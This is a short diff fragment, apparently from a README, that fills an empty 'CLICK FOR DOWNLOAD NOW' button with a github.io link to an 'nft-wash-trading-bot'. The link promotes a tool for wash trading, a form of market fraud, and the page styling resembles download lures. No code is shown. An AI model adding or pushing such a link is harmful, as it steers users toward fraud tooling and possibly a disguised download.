@@ -4,7 +4,7 @@
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://selffiscalscheme.github.io/nft-wash-trading-bot-zt69/ ) |
  |---------------------|----------------------:|
 
 
